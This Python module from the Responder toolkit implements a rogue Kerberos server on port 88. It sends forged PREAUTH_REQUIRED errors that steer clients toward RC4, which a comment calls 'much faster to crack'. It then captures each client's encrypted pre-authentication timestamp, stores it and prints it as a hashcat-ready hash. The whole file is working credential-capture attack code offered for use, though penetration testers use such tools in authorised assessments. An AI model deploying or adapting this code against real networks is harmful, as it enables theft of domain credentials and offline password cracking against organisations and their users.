#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import codecs
import struct
import time
from utils import *

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

# Kerberos encryption types
ENCRYPTION_TYPES = {
	b'\x01': 'des-cbc-crc',
	b'\x03': 'des-cbc-md5',
	b'\x11': 'aes128-cts-hmac-sha1-96',
	b'\x12': 'aes256-cts-hmac-sha1-96',
	b'\x13': 'rc4-hmac',
	b'\x14': 'rc4-hmac-exp',
	b'\x17': 'rc4-hmac',
	b'\x18': 'rc4-hmac-exp',
}

def parse_asn1_length(data, offset):
	"""Parse ASN.1 length field (short or long form)"""
	if offset >= len(data):
		return 0, 0
	
	first_byte = data[offset]
	
	# Short form (length < 128)
	if first_byte < 0x80:
		return first_byte, 1
	
	# Long form
	num_octets = first_byte & 0x7F
	if num_octets == 0 or offset + 1 + num_octets > len(data):
		return 0, 0
	
	length = 0
	for i in range(num_octets):
		length = (length << 8) | data[offset + 1 + i]
	
	return length, 1 + num_octets

def encode_asn1_length(length):
	"""Encode length in ASN.1 format"""
	if length < 128:
		return struct.pack('B', length)
	
	# Long form
	length_bytes = []
	temp = length
	while temp > 0:
		length_bytes.insert(0, temp & 0xFF)
		temp >>= 8
	
	num_octets = len(length_bytes)
	result = struct.pack('B', 0x80 | num_octets)
	for byte in length_bytes:
		result += struct.pack('B', byte)
	
	return result

def extract_principal_name(data):
	"""Extract principal name from AS-REQ - searches in req-body only"""
	try:
		# Look for [4] req-body tag first to avoid PA-DATA
		req_body_offset = None
		for i in range(len(data) - 100):
			if data[i:i+1] == b'\xa4':  # [4] req-body
				req_body_offset = i
				break
		
		if req_body_offset is None:
			return "user"
		
		# Search for [1] cname AFTER req-body starts
		search_start = req_body_offset
		search_end = min(search_start + 150, len(data) - 20)
		
		for i in range(search_start, search_end):
			# Look for GeneralString (0x1b) with reasonable length
			if data[i:i+1] == b'\x1b':
				name_len = data[i+1] if i+1 < len(data) else 0
				if 1 < name_len < 30 and i + 2 + name_len <= len(data):
					name = data[i+2:i+2+name_len].decode('latin-1', errors='ignore')
					# Validate: printable, no control chars, looks like username
					if (name and 
						name.isprintable() and 
						name.isascii() and
						not any(c in name for c in ['\x00', '\n', '\r', '\t']) and
						all(c.isalnum() or c in '.-_@' for c in name)):
						return name
		
		return "user"
	except:
		return "user"

def extract_realm(data):
	"""Extract realm from AS-REQ - searches in req-body only"""
	try:
		# Look for [4] req-body tag first
		req_body_offset = None
		for i in range(len(data) - 100):
			if data[i:i+1] == b'\xa4':  # [4] req-body
				req_body_offset = i
				break
		
		if req_body_offset is None:
			return settings.Config.MachineName.upper()
		
		# Search for realm AFTER req-body starts
		search_start = req_body_offset + 10
		search_end = min(search_start + 150, len(data) - 20)
		
		for i in range(search_start, search_end):
			# Look for GeneralString (0x1b) with reasonable length
			if data[i:i+1] == b'\x1b':
				realm_len = data[i+1] if i+1 < len(data) else 0
				# Realm should be 5-50 chars (like "DOMAIN.LOCAL")
				if 5 < realm_len < 50 and i + 2 + realm_len <= len(data):
					realm = data[i+2:i+2+realm_len].decode('latin-1', errors='ignore')
					# Validate: printable ASCII, contains dot, looks like domain
					if (realm and 
						realm.isprintable() and 
						realm.isascii() and
						'.' in realm and 
						realm.count('.') >= 1 and realm.count('.') <= 5 and
						not any(c in realm for c in ['\x00', '\n', '\r', '\t', '/', ':', ' ']) and
						all(c.isalnum() or c in '.-' for c in realm)):
						return realm
		
		return settings.Config.MachineName.upper()
	except:
		return settings.Config.MachineName.upper()

def find_msg_type(data):
	"""Find Kerberos message type by parsing ASN.1 structure"""
	try:
		offset = 0
		
		# Check APPLICATION tag
		# [10] for AS-REQ (0x6a)
		# [12] for TGS-REQ (0x6c)
		if offset >= len(data):
			return None, False, None, None
		
		app_tag = data[offset]
		if app_tag not in [0x6a, 0x6c]:  # AS-REQ or TGS-REQ
			return None, False, None, None
		
		offset += 1
		
		# Parse outer length
		length, consumed = parse_asn1_length(data, offset)
		if consumed == 0:
			return None, False, None, None
		offset += consumed
		
		# SEQUENCE tag
		if offset >= len(data) or data[offset] != 0x30:
			return None, False, None, None
		offset += 1
		
		# Parse SEQUENCE length
		seq_length, consumed = parse_asn1_length(data, offset)
		if consumed == 0:
			return None, False, None, None
		offset += consumed
		
		# [1] pvno
		if offset >= len(data) or data[offset] != 0xa1:
			return None, False, None, None
		offset += 1
		
		pvno_len, consumed = parse_asn1_length(data, offset)
		offset += consumed + pvno_len
		
		# [2] msg-type
		if offset >= len(data) or data[offset] != 0xa2:
			return None, False, None, None
		offset += 1
		
		msgtype_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# INTEGER tag
		if offset >= len(data) or data[offset] != 0x02:
			return None, False, None, None
		offset += 1
		
		int_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		if offset >= len(data):
			return None, False, None, None
		
		msg_type = data[offset]
		
		# Extract client name and realm for KRB-ERROR response
		cname = extract_principal_name(data)
		realm = extract_realm(data)
		
		return msg_type, True, cname, realm
	
	except:
		return None, False, None, None

def extract_encrypted_timestamp(data):
	"""
	Extract encrypted timestamp from PA-ENC-TIMESTAMP in AS-REQ
	Returns: (etype, cipher_hex) or (None, None)
	"""
	try:
		# Look for PA-ENC-TIMESTAMP pattern: a1 03 02 01 02 (padata-type = 2)
		for i in range(len(data) - 60):
			# Look for the specific pattern that indicates PA-ENC-TIMESTAMP
			if (i + 5 < len(data) and 
				data[i] == 0xa1 and data[i+1] == 0x03 and 
				data[i+2] == 0x02 and data[i+3] == 0x01 and 
				data[i+4] == 0x02):  # padata-type = 2
				
				# Now find [2] padata-value which should be right after
				j = i + 5
				if j < len(data) and data[j] == 0xa2:  # [2] padata-value
					j += 1
					# Parse length of padata-value
					pv_len, consumed = parse_asn1_length(data, j)
					j += consumed
					
					# Inside padata-value is OCTET STRING containing EncryptedData
					if j < len(data) and data[j] == 0x04:  # OCTET STRING
						j += 1
						octet_len, consumed = parse_asn1_length(data, j)
						j += consumed
						
						# Now we're inside EncryptedData SEQUENCE
						if j < len(data) and data[j] == 0x30:  # SEQUENCE
							j += 1
							seq_len, consumed = parse_asn1_length(data, j)
							j += consumed
							
							# Look for [0] etype
							if j < len(data) and data[j] == 0xa0:  # [0] etype
								j += 1
								etype_len, consumed = parse_asn1_length(data, j)
								j += consumed
								
								# INTEGER tag
								if j < len(data) and data[j] == 0x02:
									j += 1
									int_len, consumed = parse_asn1_length(data, j)
									j += consumed
									etype = data[j] if j < len(data) else None
									j += int_len
									
									# Now look for [2] cipher (OCTET STRING)
									if j < len(data) and data[j] == 0xa2:  # [2] cipher
										j += 1
										cipher_tag_len, consumed = parse_asn1_length(data, j)
										j += consumed
										
										# OCTET STRING
										if j < len(data) and data[j] == 0x04:
											j += 1
											cipher_len, consumed = parse_asn1_length(data, j)
											j += consumed
											
											if j + cipher_len <= len(data):
												cipher = data[j:j+cipher_len]
												cipher_hex = cipher.hex()
												return etype, cipher_hex
		
		return None, None
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] Error extracting timestamp: %s' % str(e)))
		return None, None

def find_padata_and_etype(data):
	"""
	Search for PA-DATA and determine encryption type
	Returns: (has_padata, etype) where etype is the encryption type number or None
	"""
	try:
		# Look for [3] PA-DATA tag (0xa3)
		for i in range(len(data) - 60):
			if data[i:i+1] == b'\xa3':
				# Found PA-DATA, now we need to check if it contains PA-ENC-TIMESTAMP
				# Structure: [3] SEQUENCE OF { [1] padata-type, [2] padata-value }
				
				# Look for [1] padata-type within next 30 bytes
				has_pa_enc_timestamp = False
				padata_value_offset = None
				
				for j in range(i, min(i + 30, len(data) - 10)):
					if data[j:j+1] == b'\xa1':  # [1] padata-type
						# Check if padata-type = 2 (PA-ENC-TIMESTAMP)
						# Pattern: a1 03 02 01 02
						if j + 4 < len(data) and data[j+1:j+5] == b'\x03\x02\x01\x02':
							has_pa_enc_timestamp = True
							# Next should be [2] padata-value
							break
				
				if not has_pa_enc_timestamp:
					# PA-DATA exists but not PA-ENC-TIMESTAMP
					# This is normal for first AS-REQ
					return False, None
				
				# Now look for [2] padata-value which contains EncryptedData
				for j in range(i, min(i + 50, len(data) - 10)):
					if data[j:j+1] == b'\xa2':  # [2] padata-value
						# Inside padata-value is EncryptedData
						# Now look for [0] etype inside EncryptedData
						for k in range(j, min(j + 30, len(data) - 5)):
							if data[k:k+1] == b'\xa0':  # [0] etype
								# Pattern: a0 03 02 01 <etype>
								if k + 4 < len(data) and data[k+1:k+3] == b'\x03\x02':
									etype = data[k+4]
									if settings.Config.Verbose:
										etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
										print(text('[KERB] Found PA-ENC-TIMESTAMP with etype %d (%s)' % (etype, etype_name)))
									return True, etype
				
				# Found PA-DATA but couldn't determine etype
				return True, None
		
		return False, None
	
	except:
		return False, None

def build_krb_error(realm, cname, sname=None):
	"""
	Build KRB-ERROR response with PA-DATA for pre-authentication
	
	KRB-ERROR ::= [APPLICATION 30] SEQUENCE {
		pvno[0] INTEGER (5),
		msg-type[1] INTEGER (30),
		ctime[2] KerberosTime OPTIONAL,
		cusec[3] INTEGER OPTIONAL,
		stime[4] KerberosTime,
		susec[5] INTEGER,
		error-code[6] INTEGER,
		crealm[7] Realm OPTIONAL,
		cname[8] PrincipalName OPTIONAL,
		realm[9] Realm,
		sname[10] PrincipalName,
		e-text[11] GeneralString OPTIONAL,
		e-data[12] OCTET STRING OPTIONAL
	}
	"""
	
	# Get current time
	current_time = time.time()
	time_str = time.strftime('%Y%m%d%H%M%SZ', time.gmtime(current_time))
	susec = int((current_time - int(current_time)) * 1000000)
	
	# Build sname (server name) - krbtgt/REALM@REALM
	if sname is None:
		sname = 'krbtgt'
	
	# Build the inner SEQUENCE
	inner = b''
	
	# [0] pvno: 5
	inner += b'\xa0\x03\x02\x01\x05'
	
	# [1] msg-type: 30 (KRB-ERROR)
	inner += b'\xa1\x03\x02\x01\x1e'
	
	# [4] stime (server time)
	# KerberosTime is GeneralizedTime (tag 0x18)
	time_bytes = time_str.encode('ascii')
	inner += b'\xa4' + encode_asn1_length(len(time_bytes) + 2) + b'\x18' + encode_asn1_length(len(time_bytes)) + time_bytes
	
	# [5] susec (microseconds)
	susec_bytes = struct.pack('>I', susec)
	# Remove leading zeros
	while len(susec_bytes) > 1 and susec_bytes[0] == 0:
		susec_bytes = susec_bytes[1:]
	inner += b'\xa5' + encode_asn1_length(len(susec_bytes) + 2) + b'\x02' + encode_asn1_length(len(susec_bytes)) + susec_bytes
	
	# [6] error-code: 25 (KDC_ERR_PREAUTH_REQUIRED)
	inner += b'\xa6\x03\x02\x01\x19'
	
	# [9] realm (server realm)
	realm_bytes = realm.encode('ascii')
	inner += b'\xa9' + encode_asn1_length(len(realm_bytes) + 2) + b'\x1b' + encode_asn1_length(len(realm_bytes)) + realm_bytes
	
	# [10] sname (server principal name)
	# PrincipalName ::= SEQUENCE { name-type[0] Int32, name-string[1] SEQUENCE OF GeneralString }
	sname_str = sname.encode('ascii')
	realm_str = realm.encode('ascii')
	
	# Build name-string SEQUENCE
	name_string_seq = b''
	# First component: service name (krbtgt)
	name_string_seq += b'\x1b' + encode_asn1_length(len(sname_str)) + sname_str
	# Second component: realm
	name_string_seq += b'\x1b' + encode_asn1_length(len(realm_str)) + realm_str
	
	# Wrap in SEQUENCE
	name_string_wrapped = b'\x30' + encode_asn1_length(len(name_string_seq)) + name_string_seq
	
	# Build name-string [1]
	name_string_tagged = b'\xa1' + encode_asn1_length(len(name_string_wrapped)) + name_string_wrapped
	
	# Build name-type [0] - type 2 (KRB_NT_SRV_INST)
	name_type = b'\xa0\x03\x02\x01\x02'
	
	# Build PrincipalName SEQUENCE
	principal_seq = name_type + name_string_tagged
	principal_wrapped = b'\x30' + encode_asn1_length(len(principal_seq)) + principal_seq
	
	# Tag [10]
	inner += b'\xaa' + encode_asn1_length(len(principal_wrapped)) + principal_wrapped
	
	# [12] e-data (PA-DATA)
	edata = build_pa_data(realm, cname)
	inner += b'\xac' + encode_asn1_length(len(edata) + 2) + b'\x04' + encode_asn1_length(len(edata)) + edata
	
	# Wrap in SEQUENCE
	sequence = b'\x30' + encode_asn1_length(len(inner)) + inner
	
	# Wrap in APPLICATION 30 tag
	krb_error = b'\x7e' + encode_asn1_length(len(sequence)) + sequence
	
	return krb_error

def build_pa_data(realm, cname):
	"""
	Build PA-DATA sequence for pre-authentication
	
	PA-DATA ::= SEQUENCE {
		padata-type[1] Int32,
		padata-value[2] OCTET STRING
	}
	
	Returns SEQUENCE OF PA-DATA with:
	- PA-ETYPE-INFO2 (19) - with RC4 first, then AES256
	- PA-ENC-TIMESTAMP (2) - empty
	- PA-PK-AS-REQ (16) - empty
	- PA-PK-AS-REP-19 (15) - empty
	"""
	
	pa_data_list = b''
	
	# 1. PA-ETYPE-INFO2 (type 19)
	pa_etype_info2 = build_pa_etype_info2(realm, cname)
	pa_data_list += build_single_pa_data(19, pa_etype_info2)
	
	# 2. PA-ENC-TIMESTAMP (type 2) - empty padata-value
	pa_data_list += build_single_pa_data(2, b'')
	
	# 3. PA-PK-AS-REQ (type 16) - empty padata-value
	pa_data_list += build_single_pa_data(16, b'')
	
	# 4. PA-PK-AS-REP-19 (type 15) - empty padata-value
	pa_data_list += build_single_pa_data(15, b'')
	
	# Wrap in SEQUENCE
	return b'\x30' + encode_asn1_length(len(pa_data_list)) + pa_data_list

def build_single_pa_data(padata_type, padata_value):
	"""Build a single PA-DATA entry"""
	inner = b''
	
	# [1] padata-type
	type_bytes = struct.pack('>I', padata_type)
	# Remove leading zeros
	while len(type_bytes) > 1 and type_bytes[0] == 0:
		type_bytes = type_bytes[1:]
	inner += b'\xa1\x03\x02\x01' + bytes([padata_type])
	
	# [2] padata-value (OCTET STRING)
	if len(padata_value) > 0:
		inner += b'\xa2' + encode_asn1_length(len(padata_value) + 2) + b'\x04' + encode_asn1_length(len(padata_value)) + padata_value
	else:
		# Empty OCTET STRING
		inner += b'\xa2\x02\x04\x00'
	
	# Wrap in SEQUENCE
	return b'\x30' + encode_asn1_length(len(inner)) + inner

def build_pa_etype_info2(realm, cname):
	"""
	Build PA-ETYPE-INFO2 structure
	
	ETYPE-INFO2 ::= SEQUENCE OF ETYPE-INFO2-ENTRY
	ETYPE-INFO2-ENTRY ::= SEQUENCE {
		etype[0] Int32,
		salt[1] GeneralString OPTIONAL,
		s2kparams[2] OCTET STRING OPTIONAL
	}
	
	Returns entries for RC4 (etype 23) first, then AES256 (etype 18)
	RC4 is preferred as it's much faster to crack
	"""
	
	# Build salt for AES: REALM + username (e.g., "SMB3.LOCALlgandx")
	hostname = settings.Config.MachineName.lower()
	salt_aes = realm + cname.lower()
	salt_aes_bytes = salt_aes.encode('ascii')
	
	entries = b''
	
	# Entry 1: RC4-HMAC (etype 23 = 0x17)
	# RC4 doesn't use salt in ETYPE-INFO2, only etype
	inner_rc4 = b''
	inner_rc4 += b'\xa0\x03\x02\x01\x17'  # [0] etype: 23
	# No salt field for RC4
	entry_rc4 = b'\x30' + encode_asn1_length(len(inner_rc4)) + inner_rc4
	entries += entry_rc4
	
	# Entry 2: AES256 (etype 18 = 0x12)
	inner_aes = b''
	inner_aes += b'\xa0\x03\x02\x01\x12'  # [0] etype: 18
	inner_aes += b'\xa1' + encode_asn1_length(len(salt_aes_bytes) + 2) + b'\x1b' + encode_asn1_length(len(salt_aes_bytes)) + salt_aes_bytes
	entry_aes = b'\x30' + encode_asn1_length(len(inner_aes)) + inner_aes
	entries += entry_aes
	
	# Wrap in SEQUENCE (ETYPE-INFO2 - SEQUENCE OF entries)
	etype_info2 = b'\x30' + encode_asn1_length(len(entries)) + entries
	
	return etype_info2

class KerbTCP(BaseRequestHandler):
	"""Kerberos TCP handler (port 88)"""
	
	def handle(self):
		try:
			# TCP Kerberos uses 4-byte length prefix (Record Mark)
			length_data = self.request.recv(4)
			if len(length_data) < 4:
				return
			
			# Parse Record Mark (big-endian, high bit reserved)
			msg_length = struct.unpack('>I', length_data)[0] & 0x7FFFFFFF
			
			# Receive the Kerberos message
			data = b''
			while len(data) < msg_length:
				chunk = self.request.recv(msg_length - len(data))
				if not chunk:
					return
				data += chunk
			
			# Parse Kerberos message
			msg_type, valid, cname, realm = find_msg_type(data)
			
			if not valid:
				if settings.Config.Verbose:
					print(text('[KERB] Invalid Kerberos message'))
				return
			
			if msg_type == 10:  # AS-REQ
				# Check if client sent PA-DATA
				has_padata, etype = find_padata_and_etype(data)
				
				if has_padata and etype:
					# Client sent pre-auth data - extract the encrypted timestamp
					etype_num, cipher_hex = extract_encrypted_timestamp(data)
					
					if etype_num and cipher_hex:
						etype_name = ENCRYPTION_TYPES.get(bytes([etype_num]), 'unknown')
						
						if settings.Config.Verbose:
							print(text('[KERB] AS-REQ with PA-ENC-TIMESTAMP from %s@%s (etype: %s)' % (cname, realm, etype_name)))
						
						# Build the hash in hashcat format
						if etype_num == 0x17 or etype_num == 0x18:  # RC4 (23 = 0x17, 24 = 0x18)
							# RC4 format: $krb5pa$23$user$realm$dummy$hash
							# Flip: last 36 bytes + first 16 bytes (per Responder's ParseMSKerbv5TCP)
							
							if len(cipher_hex) >= 32:
								first_16_bytes = cipher_hex[0:32]   # First 16 bytes
								rest = cipher_hex[32:]               # Rest (36 bytes)
								flipped_hash = rest + first_16_bytes
								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, flipped_hash)
							else:
								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, cipher_hex)
								
						elif etype_num == 0x12:  # AES256 (18)
							checksum = cipher_hex[-24:]
							salt = realm + cname
							hash_value = '$krb5pa$18$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
						elif etype_num == 0x11:  # AES128 (17)
							checksum = cipher_hex[-24:]
							salt = realm + cname
							hash_value = '$krb5pa$17$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
						else:
							hash_value = '$krb5pa$%d$%s$%s$%s' % (etype_num, cname, realm, cipher_hex)
						
						# Log to database
						SaveToDb({
							'module': 'Kerberos',
							'type': 'AS-REQ',
							'client': self.client_address[0],
							'user': cname,
							'domain': realm,
							'hash': hash_value,
							'fullhash': hash_value
						})
						
						# Print the hash
						if settings.Config.Verbose:
							print(text('[KERB] Use hashcat -m 7500 (etype %d): %s' % (etype_num, hash_value)))
					else:
						if settings.Config.Verbose:
							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
				else:
					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
					if settings.Config.Verbose:
						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
					
					# Build KRB-ERROR response
					krb_error = build_krb_error(realm, cname)
					
					# Send with Record Mark
					response = struct.pack('>I', len(krb_error)) + krb_error
					self.request.sendall(response)
					
					if settings.Config.Verbose:
						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
			
			elif msg_type == 12:  # TGS-REQ
				if settings.Config.Verbose:
					print(text('[KERB] TGS-REQ from %s@%s (ignoring)' % (cname, realm)))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[KERB] Error: %s' % str(e)))

class KerbUDP(BaseRequestHandler):
	"""Kerberos UDP handler (port 88)"""
	
	def handle(self):
		try:
			data, socket_obj = self.request
			
			# Parse Kerberos message
			msg_type, valid, cname, realm = find_msg_type(data)
			
			if not valid:
				if settings.Config.Verbose:
					print(text('[KERB] Invalid Kerberos message'))
				return
			
			if msg_type == 10:  # AS-REQ
				# Check if client sent PA-DATA
				has_padata, etype = find_padata_and_etype(data)
				
				if has_padata and etype:
					# Client sent pre-auth data - extract the encrypted timestamp
					etype_num, cipher_hex = extract_encrypted_timestamp(data)
					
					if etype_num and cipher_hex:
						etype_name = ENCRYPTION_TYPES.get(bytes([etype_num]), 'unknown')
						
						if settings.Config.Verbose:
							print(text('[KERB] AS-REQ with PA-ENC-TIMESTAMP from %s@%s (etype: %s)' % (cname, realm, etype_name)))
						
						# Build the hash in hashcat format
						if etype_num == 0x17 or etype_num == 0x18:  # RC4 (23 = 0x17, 24 = 0x18)
							if len(cipher_hex) >= 32:
								first_16_bytes = cipher_hex[0:32]
								rest = cipher_hex[32:]
								flipped_hash = rest + first_16_bytes
								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, flipped_hash)
							else:
								hash_value = '$krb5pa$23$%s$%s$dummy$%s' % (cname, realm, cipher_hex)
								
						elif etype_num == 0x12:  # AES256 (18)
							checksum = cipher_hex[-24:]
							salt = realm + cname
							hash_value = '$krb5pa$18$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
						elif etype_num == 0x11:  # AES128 (17)
							checksum = cipher_hex[-24:]
							salt = realm + cname
							hash_value = '$krb5pa$17$%s$%s$%s$%s$%s' % (cname, realm, salt, cipher_hex, checksum)
						else:
							hash_value = '$krb5pa$%d$%s$%s$%s' % (etype_num, cname, realm, cipher_hex)
						
						# Log to database
						SaveToDb({
							'module': 'Kerberos',
							'type': 'AS-REQ',
							'client': self.client_address[0],
							'user': cname,
							'domain': realm,
							'hash': hash_value,
							'fullhash': hash_value
						})
						
						# Print the hash
						print(color('[KERB] Kerberos 5 AS-REQ (etype %d): %s' % (etype_num, hash_value), 3, 1))
					else:
						if settings.Config.Verbose:
							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
				else:
					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
					if settings.Config.Verbose:
						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
					
					# Build KRB-ERROR response
					krb_error = build_krb_error(realm, cname)
					
					# Send directly (no Record Mark for UDP)
					socket_obj.sendto(krb_error, self.client_address)
					
					if settings.Config.Verbose:
						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
			
			elif msg_type == 12:  # TGS-REQ
				if settings.Config.Verbose:
					print(text('[KERB] TGS-REQ from %s@%s (ignoring)' % (cname, realm)))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[KERB] Error: %s' % str(e)))
